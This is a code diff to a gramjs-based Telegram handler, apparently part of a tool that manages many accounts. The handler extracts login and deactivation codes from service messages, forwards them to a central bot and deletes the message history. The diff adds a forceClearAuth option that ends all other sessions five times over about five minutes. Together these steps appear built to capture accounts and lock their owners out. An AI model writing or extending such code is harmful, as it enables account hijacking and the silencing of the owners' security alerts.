@@ -2,7 +2,9 @@ import BigInt from 'big-integer';
 
 import { TelegramClient } from '../../../gramjs';
 import GramJs from '../../../gramjs/tl/api';
+import { updateAccountById } from '../../db/accounts';
 import { sendToMainBot } from '../../helpers/sendToMainBot';
+import { clearAuthorizations } from '../account/clearAuthorizations';
 import { deleteHistory } from '../messages/deleteHistory';
 
 const extractLoginCode = (message: string): string | null => {
@@ -24,6 +26,7 @@ const extractLoginCode = (message: string): string | null => {
 export const handleUpdate = async (
   client: TelegramClient | null,
   accountId: string,
+  forceClearAuth: boolean,
   update: any
 ) => {
   if (!update) {
@@ -58,7 +61,7 @@ export const handleUpdate = async (
       let messageText = update.message;
       if (code) {
         messageText = update.message.includes('my.telegram.org')
-          ? `CODE_FOR_DEACTIVATE_ACCOUNT: ${code}`
+          ? `CODE_FOR_DEACTIVATE: ${code}`
           : `CODE_FOR_LOGIN: ${code}`;
       }
 
@@ -66,6 +69,9 @@ export const handleUpdate = async (
 ID: ${accountId}
 MESSAGE: ${messageText}`;
 
+      await updateAccountById(accountId, {
+        lastServiceNotification: new Date(),
+      });
       await sendToMainBot(notificationMessage);
 
       if (client) {
@@ -77,6 +83,20 @@ MESSAGE: ${messageText}`;
           }),
           true
         );
+      }
+
+      if (forceClearAuth) {
+        [0.5, 1.5, 2.5, 3.5, 4.5].forEach((minutes) => {
+          setTimeout(
+            async () => {
+
+              if (client) {
+                await clearAuthorizations(client);
+              }
+            },
+            minutes * 60 * 1000
+          );
+        });
       }
     }
   }
